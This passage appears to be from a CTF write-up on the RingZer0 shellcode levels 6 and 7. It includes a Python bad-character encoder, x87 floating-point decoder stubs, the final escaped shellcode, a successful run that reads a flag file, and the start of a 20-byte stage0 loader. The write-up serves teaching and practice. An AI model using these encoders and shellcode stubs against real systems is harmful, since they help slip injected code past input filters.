</span><span class='line'>          <span class="n">c</span> <span class="o">=</span> <span class="n">b</span> <span class="o">-</span> <span class="n">i</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
</span><span class='line'>              <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">c</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                  <span class="n">carry</span> <span class="o">=</span> <span class="mi">1</span> <span class="c"># this carry is necessary, because the if the byte overflows, it is carried over to the next byte. </span>
</span><span class='line'>              <span class="c"># return the two bytes that encode the required byte</span>
</span><span class='line'>              <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;cannot find proper byte for {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">]</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'><span class="c"># paranoia!</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;shellcode&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">sc</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">sc</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">commands</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">defines</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">num_commands</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x8f</span><span class="s">&quot;</span>
</span><span class='line'>  
</span><span class='line'><span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>  <span class="p">(</span><span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">)</span> <span class="o">=</span> <span class="n">find_sub_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">storage</span> <span class="o">+=</span> <span class="n">b1</span>
</span><span class='line'>  <span class="n">encoded_bytes</span> <span class="o">+=</span> <span class="n">b2</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">storage</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>      <span class="c"># emit</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span> <span class="c"># clear carry, not necessary for next dword!</span>
</span><span class='line'>      <span class="n">commands</span> <span class="o">+=</span> <span class="s">&quot;_a{} dd {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">storage</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">defines</span> <span class="o">+=</span> <span class="s">&quot;_b{} dd {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">encoded_bytes</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">num_commands</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>                  
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;default rel</span>
</span><span class='line'><span class="s">bits 64</span>
</span><span class='line'>
</span><span class='line'><span class="s">;mov rax, 10</span>
</span><span class='line'><span class="s">;mov rdi, 0x400000</span>
</span><span class='line'><span class="s">;mov rsi, 0x1000</span>
</span><span class='line'><span class="s">;mov rdx, 7</span>
</span><span class='line'><span class="s">;syscall</span>
</span><span class='line'>
</span><span class='line'><span class="s">;lea rax, [_start]</span>
</span><span class='line'>
</span><span class='line'><span class="s">_start:</span>
</span><span class='line'><span class="s">_stage0:              ; stage0 will carve out stage1 </span>
</span><span class='line'><span class="s">xor ecx,ecx</span>
</span><span class='line'><span class="s">jmp _decoder</span>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">commands</span>
</span><span class='line'><span class="k">print</span> <span class="n">defines</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">_decoder:</span>
</span><span class='line'><span class="s">xor ebx,ebx</span>
</span><span class='line'><span class="s">mov cl, (_a{}-_start)/4</span>
</span><span class='line'><span class="s">mov bl, (_b{}-_start)/4</span>
</span><span class='line'><span class="s">_decodeloop:</span>
</span><span class='line'><span class="s">fild dword [rax+rbx*4]</span>
</span><span class='line'><span class="s">dec bl</span>
</span><span class='line'><span class="s">fiadd dword [rax+rcx*4]</span>
</span><span class='line'><span class="s">fistp dword [rax+rcx*4]</span>
</span><span class='line'><span class="s">loop _decodeloop</span>
</span><span class='line'><span class="s">jmp _a0</span>
</span><span class='line'>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">num_commands</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This generated the following assembly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>
</span><span class='line'><span class="n">_stage0</span><span class="p">:</span>                <span class="p">;</span> <span class="n">stage0</span> <span class="n">will</span> <span class="n">carve</span> <span class="n">out</span> <span class="n">stage1</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_decoder</span>
</span><span class='line'>
</span><span class='line'><span class="n">_a0</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a1</span> <span class="n">dd</span> <span class="mh">0x2b1f1520</span>
</span><span class='line'><span class="n">_a2</span> <span class="n">dd</span> <span class="mh">0x10111a82</span>
</span><span class='line'><span class="n">_a3</span> <span class="n">dd</span> <span class="mh">0x89101010</span>
</span><span class='line'><span class="n">_a4</span> <span class="n">dd</span> <span class="mh">0x10101110</span>
</span><span class='line'><span class="n">_a5</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a6</span> <span class="n">dd</span> <span class="mh">0x10101010</span>
</span><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0x10101120</span>
</span><span class='line'>
</span><span class='line'><span class="n">_b0</span> <span class="n">dd</span> <span class="mh">0x3fb02138</span>
</span><span class='line'><span class="n">_b1</span> <span class="n">dd</span> <span class="mh">0x3f3f3f3f</span>
</span><span class='line'><span class="n">_b2</span> <span class="n">dd</span> <span class="mh">0xf4fe3ffd</span>
</span><span class='line'><span class="n">_b3</span> <span class="n">dd</span> <span class="mh">0xfe37f2a0</span>
</span><span class='line'><span class="n">_b4</span> <span class="n">dd</span> <span class="mh">0x37f4fee7</span>
</span><span class='line'><span class="n">_b5</span> <span class="n">dd</span> <span class="mh">0xfe863887</span>
</span><span class='line'><span class="n">_b6</span> <span class="n">dd</span> <span class="mh">0x3ff19ff5</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0xb2f4fe3f</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">_decoder</span><span class="p">:</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>
</span><span class='line'><span class="n">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="p">(</span><span class="n">_a7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="p">(</span><span class="n">_b7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">_decodeloop</span><span class="p">:</span>
</span><span class='line'><span class="n">fild</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="n">dec</span> <span class="n">bl</span>
</span><span class='line'><span class="n">fiadd</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="n">loop</span> <span class="n">_decodeloop</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_a0</span>
</span></code></pre></td></tr></table></div></figure>


<p>There was, however, a huge problem. The instruction <code>jmp _decoder</code> generated a bad char: <code>0x40</code>. This is because it has to jump over two times 32 bytes of data to reach the decoder, which is exactly 64 bytes. However, the shellcode is only 31 bytes long, while I store 32 bytes. That means that the last byte is redundant! I exploited this fact by making this final byte a NOP. But because it is used in the decoding process, I had to modify <code>encode.py</code> again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>  <span class="c">#data += &quot;\xc3&quot;</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x8f</span><span class="s">&quot;</span>    <span class="c"># found by trial &amp; error ;)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This modifies the two last constants:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0x90101120</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0xfef4fe3f</span>
</span></code></pre></td></tr></table></div></figure>


<p>I switched them around, so that the last byte of _b7 would be the 0x90 byte. Then, I could jump there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">jmp</span> <span class="n">_b7</span><span class="o">+</span><span class="mi">3</span>           <span class="p">;</span> <span class="n">assembles</span> <span class="n">to</span> <span class="n">eb</span> <span class="mi">3</span><span class="n">f</span> <span class="o">-&gt;</span> <span class="n">no</span> <span class="n">more</span> <span class="n">badchars</span><span class="err">!</span>
</span><span class='line'>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0xfef4fe3f</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0x90101120</span>   <span class="p">;</span> <span class="n">this</span> <span class="n">was</span> <span class="mh">0xfef4fe3f</span> <span class="p">(</span><span class="n">little</span> <span class="n">endianess</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The working shellcode now looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>
</span><span class='line'><span class="n">_stage0</span><span class="p">:</span>                <span class="p">;</span> <span class="n">stage0</span> <span class="n">will</span> <span class="n">carve</span> <span class="n">out</span> <span class="n">stage1</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_b7</span><span class="o">+</span><span class="mi">3</span>               <span class="p">;</span> <span class="n">jump</span> <span class="n">to</span> <span class="n">the</span> <span class="n">NOP</span><span class="p">,</span> <span class="n">avoiding</span> <span class="n">a</span> <span class="n">bad</span> <span class="n">char</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">_a0</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a1</span> <span class="n">dd</span> <span class="mh">0x2b1f1520</span>
</span><span class='line'><span class="n">_a2</span> <span class="n">dd</span> <span class="mh">0x10111a82</span>
</span><span class='line'><span class="n">_a3</span> <span class="n">dd</span> <span class="mh">0x89101010</span>
</span><span class='line'><span class="n">_a4</span> <span class="n">dd</span> <span class="mh">0x10101110</span>
</span><span class='line'><span class="n">_a5</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a6</span> <span class="n">dd</span> <span class="mh">0x10101010</span>
</span><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0xfef4fe3f</span>
</span><span class='line'>
</span><span class='line'><span class="n">_b0</span> <span class="n">dd</span> <span class="mh">0x3fb02138</span>
</span><span class='line'><span class="n">_b1</span> <span class="n">dd</span> <span class="mh">0x3f3f3f3f</span>
</span><span class='line'><span class="n">_b2</span> <span class="n">dd</span> <span class="mh">0xf4fe3ffd</span>
</span><span class='line'><span class="n">_b3</span> <span class="n">dd</span> <span class="mh">0xfe37f2a0</span>
</span><span class='line'><span class="n">_b4</span> <span class="n">dd</span> <span class="mh">0x37f4fee7</span>
</span><span class='line'><span class="n">_b5</span> <span class="n">dd</span> <span class="mh">0xfe863887</span>
</span><span class='line'><span class="n">_b6</span> <span class="n">dd</span> <span class="mh">0x3ff19ff5</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0x90101120</span>
</span><span class='line'>
</span><span class='line'><span class="n">_decoder</span><span class="p">:</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>
</span><span class='line'>
</span><span class='line'><span class="n">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="p">(</span><span class="n">_a7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="p">(</span><span class="n">_b7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">_decodeloop</span><span class="p">:</span>    
</span><span class='line'><span class="n">fild</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="p">;</span> <span class="n">load</span> <span class="n">integer</span>
</span><span class='line'><span class="n">dec</span> <span class="n">bl</span>
</span><span class='line'><span class="n">fiadd</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">;</span> <span class="n">do</span> <span class="n">the</span> <span class="n">actual</span> <span class="n">decoding</span>
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">;</span> <span class="n">store</span> <span class="n">the</span> <span class="n">decoded</span> <span class="nb">bytes</span>
</span><span class='line'><span class="n">loop</span> <span class="n">_decodeloop</span>        <span class="p">;</span> <span class="n">use</span> <span class="n">rcx</span> <span class="k">as</span> <span class="n">counter</span> <span class="ow">and</span> <span class="n">index</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_a0</span>                 <span class="p">;</span> <span class="n">jump</span> <span class="n">to</span> <span class="n">decoded</span> <span class="n">shellcode</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s run it!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">shellcode</span><span class="o">&gt;</span>\<span class="n">x31</span>\<span class="n">xc9</span>\<span class="n">xeb</span>\<span class="n">x3f</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x20</span>\<span class="n">x15</span>\<span class="n">x1f</span>\<span class="n">x2b</span>\<span class="n">x82</span>\<span class="n">x1a</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x89</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x3f</span>\<span class="n">xfe</span>\<span class="n">xf4</span>\<span class="n">xfe</span>\<span class="n">x38</span>\<span class="n">x21</span>\<span class="n">xb0</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">xfd</span>\<span class="n">x3f</span>\<span class="n">xfe</span>\<span class="n">xf4</span>\<span class="n">xa0</span>\<span class="n">xf2</span>\<span class="n">x37</span>\<span class="n">xfe</span>\<span class="n">xe7</span>\<span class="n">xfe</span>\<span class="n">xf4</span>\<span class="n">x37</span>\<span class="n">x87</span>\<span class="n">x38</span>\<span class="n">x86</span>\<span class="n">xfe</span>\<span class="n">xf5</span>\<span class="n">x9f</span>\<span class="n">xf1</span>\<span class="n">x3f</span>\<span class="n">x20</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x90</span>\<span class="n">x31</span>\<span class="n">xdb</span>\<span class="n">xb1</span>\<span class="n">x08</span>\<span class="n">xb3</span>\<span class="n">x10</span>\<span class="n">xdb</span>\<span class="n">x04</span>\<span class="n">x98</span>\<span class="n">xfe</span>\<span class="n">xcb</span>\<span class="n">xda</span>\<span class="n">x04</span>\<span class="n">x88</span>\<span class="n">xdb</span>\<span class="n">x1c</span>\<span class="n">x88</span>\<span class="n">xe2</span>\<span class="n">xf3</span>\<span class="n">xeb</span>\<span class="n">xab</span>
</span><span class='line'>  <span class="n">Shellcode</span> <span class="n">received</span><span class="o">...</span>
</span><span class='line'>  <span class="n">Shellcode</span> <span class="n">length</span> <span class="p">(</span><span class="mi">89</span><span class="p">)</span> <span class="nb">bytes</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">Success</span><span class="p">:</span> <span class="n">Executing</span> <span class="n">shellcode</span><span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="o">/</span><span class="n">flag</span><span class="o">/</span><span class="n">level6</span><span class="o">.</span><span class="n">flag</span><span class="o">^</span><span class="err">@</span>
</span><span class='line'><span class="n">FLAG</span><span class="o">-&lt;</span><span class="n">redacted</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ringzer0team</span><span class="o">.</span><span class="n">com</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Got it with <em>one</em> byte to spare!</p>

<h2>Level 7: Ultra-Violence</h2>

<p>OK, I thought the last level was pretty hard, having to resort to floating point instructions to carve out a shellcode. I was shocked to see the description for level 7:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">This</span> <span class="n">level</span> <span class="n">have</span> <span class="n">shellcode</span> <span class="n">restriction</span><span class="o">.</span> <span class="n">Bad</span> <span class="n">char</span> <span class="nb">list</span> <span class="s">&quot;</span><span class="se">\x0a\x0d\x2f\xff\x0f\x05\x68</span><span class="s"> and </span><span class="se">\x30</span><span class="s"> to </span><span class="se">\x81</span><span class="s">&quot;</span> <span class="nb">max</span> <span class="n">size</span> <span class="mi">40</span> <span class="nb">bytes</span><span class="o">.</span>
</span><span class='line'><span class="n">For</span> <span class="n">an</span> <span class="n">unknown</span> <span class="n">funky</span> <span class="n">reason</span> <span class="n">I</span> <span class="n">decide</span> <span class="n">to</span> <span class="n">add</span> <span class="n">couple</span> <span class="n">of</span> <span class="n">random</span> <span class="nb">bytes</span> <span class="ow">in</span> <span class="n">your</span> <span class="nb">buffer</span> <span class="n">after</span> <span class="n">the</span> <span class="n">twentieth</span> <span class="n">character</span><span class="o">.</span>
</span><span class='line'><span class="n">Random</span> <span class="n">chunk</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="n">size</span> <span class="ow">is</span> <span class="n">based</span> <span class="n">on</span> <span class="s">&quot;rand() % 20&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Waaaaat. A shit-ton of bad chars, plus it seems I couldn&rsquo;t trust whatever I sent after the twentieth bytes. This effectively cut my shellcode size to <em>just twenty bytes</em>. I could never send in a stage0 that would carve out the real shellcode, as there was simply not enough space. Instead, my stage 0 would have to read in the shellcode from the socket directly. So, I needed a way to call <code>syscall</code> to read from stdin. However, <code>0x0f</code> and <code>0x05</code> are badchars. Furthermore, where exactly would I store this newly read shellcode?</p>

<p>Here&rsquo;s what I came up with. I&rsquo;ll dump out stage 0 and explain it, going bit by bit (just as I did when making this monstrosity). This assembles to <em>exactly</em> 20 bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>                 
</span><span class='line'><span class="n">add</span> <span class="n">al</span><span class="p">,</span> <span class="n">_syscall</span><span class="o">-</span><span class="n">_start</span>
</span><span class='line'><span class="n">fldz</span>                   
</span><span class='line'><span class="n">fsub</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>       
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>      
</span><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>          
</span><span class='line'><span class="n">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">edi</span>         
</span><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>          
</span><span class='line'><span class="n">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="mh">0xf0</span>         
</span><span class='line'><span class="n">_syscall</span><span class="p">:</span>
</span><span class='line'><span class="n">dd</span> <span class="o">-</span><span class="mf">84907592.0</span>          
</span></code></pre></td></tr></table></div></figure>


<p>First things first, we need some way to decode an encoded version of <code>syscall</code>. Again, I turned to floating point instructions. I could a zero and then subtract another float; I might be able to get the resulting integer to decode to <code>syscall</code>!</p>

<p>Due to the size limitation, I could only encode four bytes. The rest of the shellcode would not only need to take care of decoding these four bytes, but also setting up the registers for <code>syscall read</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>                 <span class="p">;</span> <span class="n">shellcode</span> <span class="n">stage0</span><span class="p">:</span> <span class="n">read</span> <span class="ow">in</span> <span class="n">stage1</span>
